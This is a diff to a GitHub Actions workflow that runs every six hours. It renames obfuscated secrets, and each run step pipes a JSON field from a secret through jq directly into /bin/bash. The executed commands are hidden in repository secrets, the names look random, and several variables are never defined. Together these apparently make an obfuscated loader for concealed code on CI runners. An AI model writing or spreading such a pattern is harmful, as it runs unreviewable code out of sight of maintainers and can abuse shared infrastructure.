@@ -3,7 +3,8 @@ name: paprikasouthwest
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '14 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: paprikasouthwest
         env:
-          k12796: ${{ secrets.k12796 }}
+          qj652: ${{ secrets.qj652 }}
         run: |
-          echo $k12796 | jq -r .oiag500 | /bin/bash
-          echo $t3038 | jq -r .t45571 | /bin/bash
-          echo $gx45 | jq -r .nxhl2 | /bin/bash
-          echo $m58 | jq -r .c77824 | /bin/bash
-          echo $pa33002 | jq -r .xro72 | /bin/bash
-          echo $nttj7501 | jq -r .twflg1403 | /bin/bash
-          echo $nwe29 | jq -r .qdyh033 | /bin/bash
-          echo $mqhy1509 | jq -r .zejt844 | /bin/bash
-          echo $ngru1911 | jq -r .kkdt7 | /bin/bash
+          echo $qj652 | jq -r .nbfp8389 | /bin/bash
+          echo $sxlhe31 | jq -r .tkrvv078 | /bin/bash
+          echo $zq60 | jq -r .xx19 | /bin/bash
+          echo $etui1 | jq -r .x35494 | /bin/bash
 
